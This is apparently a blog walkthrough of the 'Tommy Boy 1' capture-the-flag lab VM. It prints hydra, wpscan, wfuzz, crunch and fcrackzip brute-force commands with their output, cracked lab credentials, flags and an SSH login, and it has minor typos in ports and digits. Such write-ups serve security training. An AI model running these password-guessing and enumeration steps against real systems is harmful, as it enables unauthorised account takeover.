<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>User-agent: *
</span><span class='line'>Disallow: /6packsofb...soda
</span><span class='line'>Disallow: /lukeiamyourfather
</span><span class='line'>Disallow: /lookalivelowbridge
</span><span class='line'>Disallow: /flag-numero-uno.txt
</span></code></pre></td></tr></table></div></figure>


<h3>The 1st Flag</h3>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/tommyboy1/1.png"></p>

<p>The 1st Flag is <font color="red"><code>B34rcl4ws</code></font></p>

<p>Also checked other folders but nothing found, so I decited to move on.</p>

<p>Then, by checking the source code of index page on port 80, hidden comments are found:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="nt">&lt;title&gt;</span>Welcome to Callahan Auto<span class="nt">&lt;/title&gt;</span>
</span><span class='line'><span class="nt">&lt;body&gt;</span>
</span><span class='line'><span class="nt">&lt;H1&gt;&lt;center&gt;</span>Welcome to Callahan Auto!<span class="nt">&lt;/center&gt;&lt;/H1&gt;</span>
</span><span class='line'><span class="nt">&lt;font</span> <span class="na">color=</span><span class="s">&quot;FF3339&quot;</span><span class="nt">&gt;&lt;H2&gt;</span>SYSTEM ERROR!<span class="nt">&lt;/H2&gt;&lt;/font&gt;</span>
</span><span class='line'>If your&#39;e reading this, the Callahan Auto customer ordering system is down.  Please restore the backup copy immediately.
</span><span class='line'><span class="nt">&lt;p&gt;</span>
</span><span class='line'>See Nick in IT for assistance.
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Nick: backup copy is in Big Tom&#39;s home folder--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Richard: can you give me access too? Big Tom&#39;s the only one w/password--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Nick: Yeah yeah, my processor can only handle one command at a time--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Richard: please, I&#39;ll ask nicely--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Nick: I will set you up with admin access *if* you tell Tom to stop storing important information in the company blog--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Richard: Deal.  Where&#39;s the blog again?--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Nick: Seriously? You losers are hopeless. We hid it in a folder named after the place you noticed after you and Tom Jr. had your big fight. You know, where you cracked him over the head with a board. It&#39;s here if you don&#39;t remember: https://www.youtube.com/watch?v=VUxOd4CszJ8--&gt;</span>
</span><span class='line'><span class="c">&lt;!--Comment from Richard: Ah! How could I forget?  Thanks--&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>From the comment, I got a YouTube hint: <font color="red"><code>https://www.youtube.com/watch?v=VUxOd4CszJ8</code></font>, after checked the youtube, I got the hidden blog path is <font color="red"><code>http://10.1.1.141/prehistoricforest</code></font>.</p>

<p>From the YouTube video, I got the key to access to the hidden blog (<font color="red"><em>Hint:</em></font> <strong>if met Database Error, restart the target VM should fix the problem</strong>) and found the 2nd flag clue under the post <code>Announcing the Callahan internal company blog!</code>, the URL is <code>http://10.1.1.141/prehistoricforest/index.php/2016/07/06/announcing-the-callahan-internal-company-blog/</code></p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/tommyboy1/2.png"></p>

<h3>The 2nd Flag</h3>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/tommyboy1/3.png"></p>

<p>The 2nd Flag is <font color="red"><code>Z4l1nsky</code></font></p>

<p>Another hint from the post <code>SON OF A!</code>:</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/tommyboy1/4.png"></p>

<p>There is another Image File under the folder <code>http://10.1.1.141/richard/shockedrichard.jpg</code></p>

<p>By checking the imga file with tool <code>exif</code>, I noticed that there is a MD5 hash in User Comment:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# exif shockedrichard.jpg
</span><span class='line'>EXIF tags in <span class="s1">&#39;shockedrichard.jpg&#39;</span> <span class="o">(</span><span class="s1">&#39;Intel&#39;</span> byte order<span class="o">)</span>:
</span><span class='line'>--------------------+----------------------------------------------------------
</span><span class='line'>Tag                 <span class="p">|</span>Value
</span><span class='line'>--------------------+----------------------------------------------------------
</span><span class='line'>Software            <span class="p">|</span>Google
</span><span class='line'>Copyright           <span class="p">|</span>Copyright © <span class="m">1995</span> Paramount Pictures Corporation. Credit: ©
</span><span class='line'>X-Resolution        <span class="p">|</span>72
</span><span class='line'>Y-Resolution        <span class="p">|</span>72
</span><span class='line'>Resolution Unit     <span class="p">|</span>Inch
</span><span class='line'>Exif Version        <span class="p">|</span>Exif Version 2.2
</span><span class='line'>User Comment        <span class="p">|</span>ce154b5a8e59c89732bc25d6a2e6b90b
</span><span class='line'>Pixel X Dimension   <span class="p">|</span>1600
</span><span class='line'>Pixel Y Dimension   <span class="p">|</span>1029
</span><span class='line'>FlashPixVersion     <span class="p">|</span>FlashPix Version 1.0
</span><span class='line'>Color Space         <span class="p">|</span>Internal error <span class="o">(</span>unknown value 65535<span class="o">)</span>
</span><span class='line'>--------------------+----------------------------------------------------------
</span></code></pre></td></tr></table></div></figure>


<p>By cracking the hash online and got the cracked password is <font color="red"><code>spanky</code></font>></p>

<p>In the other post <code>Protected: Status of restoring company home page</code>, I found a password is needed.</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/tommyboy1/5.png"></p>

<p>Then I input <font color="red"><code>spanky</code></font> as the password and got into the protected blog.</p>

<p>Some important information from the blog:</p>

<ul>
<li><p>In order to restore, there is a backup file called <code>callahanbak.bak</code> that we can rename it to <code>index.html</code>. (We have to do this under Big Tom&rsquo;s account via SSH)</p></li>
<li><p>Big Tom&rsquo;s account name should be able to find in the user list and may not be called as bigtom but easy to recognize.</p></li>
<li><p>There is a FTP service running on non-standard port (65543, which is found by NMAP in the previous step) and can be accessed by nick&rsquo;s account.</p></li>
<li><p>Nick&rsquo;s account name is <code>nickburns</code> and the password is very easy to guess.</p></li>
<li><p>Nick is not able to access SSH but only FTP.</p></li>
</ul>


<p>Based on the information above, I use <code>hydra</code> to do a quick brute force scanning:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# hydra -e nsr -l nickburns ftp://10.1.1.141:65534/
</span><span class='line'>Hydra v8.2 <span class="o">(</span>c<span class="o">)</span> <span class="m">2016</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2016-09-04 22:36:19
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> max <span class="m">3</span> tasks per <span class="m">1</span> server, overall <span class="m">64</span> tasks, <span class="m">3</span> login tries <span class="o">(</span>l:1/p:3<span class="o">)</span>, ~0 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ftp on port 65534
</span><span class='line'><span class="o">[</span>65534<span class="o">][</span>ftp<span class="o">]</span> host: 10.1.1.141   login: nickburns   password: nickburns
</span><span class='line'><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> finished at 2016-09-04 22:36:20
</span></code></pre></td></tr></table></div></figure>


<p>and found Nick&rsquo;s FTP login credencial is <font color="red"><code>nickburns / nickburns</code></font></p>

<p>Now I login to FTP as Nick and downloaded the only file <code>readme.txt</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# ftp 10.1.1.141 65534
</span><span class='line'>Connected to 10.1.1.141.
</span><span class='line'><span class="m">220</span> Callahan_FTP_Server 1.3.5
</span><span class='line'>Name <span class="o">(</span>10.1.1.141:root<span class="o">)</span>: nickburns
</span><span class='line'><span class="m">331</span> Password required <span class="k">for</span> nickburns
</span><span class='line'>Password:
</span><span class='line'><span class="m">230</span> User nickburns logged in
</span><span class='line'>Remote system <span class="nb">type </span>is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp&gt; list
</span><span class='line'>?Invalid <span class="nb">command</span>
</span><span class='line'>ftp&gt; dir
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful
</span><span class='line'><span class="m">150</span> Opening ASCII mode data connection <span class="k">for</span> file list
</span><span class='line'>-rw-rw-r--   <span class="m">1</span> nickburns nickburns      <span class="m">977</span> Jul <span class="m">15</span> 02:37 readme.txt
</span><span class='line'><span class="m">226</span> Transfer <span class="nb">complete</span>
</span><span class='line'>ftp&gt; get readme.txt
</span><span class='line'><span class="nb">local</span>: readme.txt remote: readme.txt
</span><span class='line'><span class="m">200</span> PORT <span class="nb">command </span>successful
</span><span class='line'><span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> readme.txt <span class="o">(</span><span class="m">977</span> bytes<span class="o">)</span>
</span><span class='line'><span class="m">226</span> Transfer <span class="nb">complete</span>
</span><span class='line'><span class="m">977</span> bytes received in 0.02 secs <span class="o">(</span>40.6745 kB/s<span class="o">)</span>
</span><span class='line'>ftp&gt; bye
</span><span class='line'><span class="m">221</span> Goodbye.
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>Due to this is WordPress application, I use <code>wpscan</code> to check if any vulnerability exists and enumerate users:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>...truncated...
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> Identified the following <span class="m">4</span> user/s:
</span><span class='line'>    +----+----------+-------------------+
</span><span class='line'>    <span class="p">|</span> Id <span class="p">|</span> Login    <span class="p">|</span> Name              <span class="p">|</span>
</span><span class='line'>    +----+----------+-------------------+
</span><span class='line'>    <span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> richard  <span class="p">|</span> richard           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> tom      <span class="p">|</span> Big Tom           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> tommy    <span class="p">|</span> Tom Jr.           <span class="p">|</span>
</span><span class='line'>    <span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> michelle <span class="p">|</span> Michelle Michelle <span class="p">|</span>
</span><span class='line'>    +----+----------+-------------------+
</span><span class='line'>...truncated...
</span></code></pre></td></tr></table></div></figure>


<p>Four WP users found:
<font color="red"></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>richard
</span><span class='line'>tom
</span><span class='line'>tommy
</span><span class='line'>michelle
</span></code></pre></td></tr></table></div></figure>


<p></font></p>

<p>Then use dictionary file <code>rockyou.txt</code> to brute force crack those users, and got tom&rsquo;s password cracked:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>  +----+----------+-------------------+----------+
</span><span class='line'>  <span class="p">|</span> Id <span class="p">|</span> Login    <span class="p">|</span> Name              <span class="p">|</span> Password <span class="p">|</span>
</span><span class='line'>  +----+----------+-------------------+----------+
</span><span class='line'>  <span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> richard  <span class="p">|</span> richard           <span class="p">|</span>          <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> tom      <span class="p">|</span> Big Tom           <span class="p">|</span> tomtom1  <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> tommy    <span class="p">|</span> Tom Jr.           <span class="p">|</span>          <span class="p">|</span>
</span><span class='line'>  <span class="p">|</span> <span class="m">4</span>  <span class="p">|</span> michelle <span class="p">|</span> Michelle Michelle <span class="p">|</span>          <span class="p">|</span>
</span><span class='line'>  +----+----------+-------------------+----------+
</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/tommyboy1/6.png"></p>

<p>After change <code>User-Agent to</code> <code>Iphone 3</code>, I got the different content!</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/tommyboy1/7.png"></p>

<p>Use <code>wfuzz</code> with <code>rockyou.txt</code> to find out the hidden html file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# wfuzz -c -v -w /usr/share/wordlists/rockyou.txt -H <span class="s2">&quot;User-Agent:Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16&quot;</span> --hc <span class="m">404</span> http://10.1.1.141:8008/NickIzL33t/FUZZ.html
</span><span class='line'>********************************************************
</span><span class='line'>* Wfuzz 2.1.3 - The Web Bruteforcer                      *
</span><span class='line'>********************************************************
</span><span class='line'>
</span><span class='line'>Target: http://10.1.1.141:8008/NickIzL33t/FUZZ.html
</span><span class='line'>Total requests: <span class="nv">14344392</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="o">==============================================================================================================================================</span>
</span><span class='line'>ID    C.Time   Response   Lines      Word         Chars                  Server                                             Redirect   <span class="nv">Request</span>
</span><span class='line'><span class="o">==============================================================================================================================================</span>
</span><span class='line'>
</span><span class='line'>97206:  0.040s   <span class="nv">C</span><span class="o">=</span><span class="m">200</span>     <span class="m">12</span> L        <span class="m">65</span> W       <span class="m">459</span> Ch     Apache/2.4.18 <span class="o">(</span>Ub                                                        <span class="s2">&quot;fallon1&quot;</span>
</span><span class='line'>...truncated...
</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/tommyboy1/8.png"></p>

<h3>The 3rd Flag</h3>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/tommyboy1/9.png"></p>

<p>The 2nd Flag is <font color="red"><code>TinyHead</code></font></p>

<p>Here is also an encrypted backup zip file <code>t0msp4ssw0rdz.zip</code> and also a hint file which including the clues about password:</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/tommyboy1/10.png"></p>

<p>Password information:</p>

<ul>
<li>start with <code>bev</code></li>
<li>one uppercase character</li>
<li>two numbers</li>
<li>two lowercase characters</li>
<li>one symbol</li>
<li>1955</li>
</ul>


<p><font color="red"><code>bev[A-Z][0-9][0-9][a-z][a-z][symbol]1955</code></font></p>

<p>Then I use <code>crunch</code> to generate a <a href="http://www.liatsisfotis.com/2013/02/create-wordlists-using-crunch.html" title="Create wordlists using crunch">dictionary list</a> with given pattern:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# crunch <span class="m">13</span> <span class="m">13</span> -t bev,%%@@^1995 -o pass_dict.lst
</span><span class='line'>Crunch will now generate the following amount of data: <span class="m">812011200</span> bytes
</span><span class='line'><span class="m">774</span> MB
</span><span class='line'><span class="m">0</span> GB
</span><span class='line'><span class="m">0</span> TB
</span><span class='line'><span class="m">0</span> PB
</span><span class='line'>Crunch will now generate the following number of lines: <span class="m">58000800</span>
</span><span class='line'>
</span><span class='line'>crunch:  27% completed generating output
</span><span class='line'>
</span><span class='line'>crunch:  53% completed generating output
</span><span class='line'>
</span><span class='line'>crunch:  83% completed generating output
</span><span class='line'>
</span><span class='line'>crunch: 100% completed generating output
</span></code></pre></td></tr></table></div></figure>


<p>Then use <code>fcrackzip</code> with the generated dictionary file to crack the encrypted store zip file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# fcrackzip -v -D -u -p pass_dict.lst t0msp4ssw0rdz.zip
</span><span class='line'>found file <span class="s1">&#39;passwords.txt&#39;</span>, <span class="o">(</span>size cp/uc    332/   641, flags 9, chk 9aad<span class="o">)</span>
</span><span class='line'>checking pw bevG72kn~1995
</span><span class='line'>
</span><span class='line'>PASSWORD FOUND!!!!: <span class="nv">pw</span> <span class="o">==</span> bevH00tr<span class="nv">$1995</span>
</span></code></pre></td></tr></table></div></figure>


<p>The password is <font color="red"><code>bevH00tr$1995</code></font> and the unzipped file is <font color="red"><code>password.txt</code></font></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# cat passwords.txt
</span><span class='line'>Sandusky Banking Site
</span><span class='line'>------------------------
</span><span class='line'>Username: BigTommyC
</span><span class='line'>Password: money
</span><span class='line'>
</span><span class='line'>TheKnot.com <span class="o">(</span>wedding site<span class="o">)</span>
</span><span class='line'>---------------------------
</span><span class='line'>Username: TomC
</span><span class='line'>Password: wedding
</span><span class='line'>
</span><span class='line'>Callahan Auto Server
</span><span class='line'>----------------------------
</span><span class='line'>Username: bigtommysenior
</span><span class='line'>Password: fatguyinalittlecoat
</span><span class='line'>
</span><span class='line'>Note: after the <span class="s2">&quot;fatguyinalittlecoat&quot;</span> part there are some numbers, but I don<span class="err">&#39;</span>t remember what they are.
</span><span class='line'>However, I wrote myself a draft on the company blog with that information.
</span><span class='line'>
</span><span class='line'>Callahan Company Blog
</span><span class='line'>----------------------------
</span><span class='line'>Username: bigtom<span class="o">(</span>I think?<span class="o">)</span>
</span><span class='line'>Password: ???
</span><span class='line'>Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
</span></code></pre></td></tr></table></div></figure>


<p>After login to the blog as Big Tom by using the password found previously in <code>wpscan</code> stage, I noticed that there is a draft post:</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/tommyboy1/11.png"></p>

<p>Now I got the Server SSH login password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Callahan Auto Server
</span><span class='line'>----------------------------
</span><span class='line'>Username: bigtommysenior
</span><span class='line'>Password: fatguyinalittlecoat1938!!
</span></code></pre></td></tr></table></div></figure>


<p>Login to SSH as Big Tom:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/tommyboy1# ssh bigtommysenior@10.1.1.141
</span><span class='line'>The authenticity of host <span class="s1">&#39;10.1.1.141 (10.1.1.141)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">ECDSA key fingerprint is SHA256:bI4/w4tR6j1XRyuLkIs5icsyLJM0Kfw9m4iPFpXX0NI.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>10.1.1.141<span class="s1">&#39; (ECDSA) to the list of known hosts.</span>
</span><span class='line'><span class="s1">bigtommysenior@10.1.1.141&#39;</span>s password:
</span><span class='line'>Welcome to Ubuntu 16.04 LTS <span class="o">(</span>GNU/Linux 4.4.0-36-generic x86_64<span class="o">)</span>
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>
</span><span class='line'><span class="m">112</span> packages can be updated.
</span><span class='line'><span class="m">0</span> updates are security updates.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Last login: Thu Jul <span class="m">14</span> 13:45:57 2016
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>bigtommysenior<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>bigtommysenior<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>bigtommysenior<span class="o">)</span>
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>uname -a
</span><span class='line'>Linux CallahanAutoSrv01 4.4.0-36-generic <span class="c">#55-Ubuntu SMP Thu Aug 11 18:01:55 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/home/bigtommysenior
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>ls -la
</span><span class='line'>total 40
</span><span class='line'>drwxr-x--- <span class="m">4</span> bigtommysenior bigtommysenior <span class="m">4096</span> Jul  <span class="m">8</span> 08:57 .
</span><span class='line'>drwxr-xr-x <span class="m">5</span> root           root           <span class="m">4096</span> Jul  <span class="m">7</span> 00:17 ..
</span><span class='line'>-rw------- <span class="m">1</span> bigtommysenior bigtommysenior    <span class="m">0</span> Jul <span class="m">21</span> 17:47 .bash_history
</span><span class='line'>-rw-r--r-- <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">220</span> Jul  <span class="m">7</span> 00:12 .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> bigtommysenior bigtommysenior <span class="m">3771</span> Jul  <span class="m">7</span> 00:12 .bashrc
</span><span class='line'>drwx------ <span class="m">2</span> bigtommysenior bigtommysenior <span class="m">4096</span> Jul  <span class="m">7</span> 00:16 .cache
</span><span class='line'>-rw-r--r-- <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">307</span> Jul  <span class="m">7</span> 14:18 callahanbak.bak
</span><span class='line'>-rw-rw-r-- <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">237</span> Jul  <span class="m">7</span> 15:27 el-flag-numero-quatro.txt
</span><span class='line'>-rw-rw-r-- <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">630</span> Jul  <span class="m">7</span> 17:59 LOOT.ZIP
</span><span class='line'>drwxrwxr-x <span class="m">2</span> bigtommysenior bigtommysenior <span class="m">4096</span> Jul  <span class="m">7</span> 13:50 .nano
</span><span class='line'>-rw-r--r-- <span class="m">1</span> bigtommysenior bigtommysenior  <span class="m">675</span> Jul  <span class="m">7</span> 00:12 .profile
</span><span class='line'>-rw-r--r-- <span class="m">1</span> bigtommysenior bigtommysenior    <span class="m">0</span> Jul  <span class="m">7</span> 00:17 .sudo_as_admin_successful
</span><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<h3>The 4th Flag</h3>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bigtommysenior@CallahanAutoSrv01:~<span class="nv">$ </span>cat el-flag-numero-quatro.txt
</span><span class='line'>YAY!  Flag <span class="m">4</span> out of 5!!!! And you should now be able to restore the Callhan Web server to normal
</span><span class='line'>working status.
</span><span class='line'>
</span><span class='line'>Flag data: EditButton
</span><span class='line'>
</span><span class='line'>But...but...where<span class="s1">&#39;s flag 5?  </span>
</span><span class='line'>
</span><span class='line'><span class="s1">I&#39;</span>ll make it easy on you.  It<span class="err">&#39;</span>s in the root of this server at /5.txt
</span></code></pre></td></tr></table></div></figure>


<p>Then doing the restoring the web site from backup, I got he server back online again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
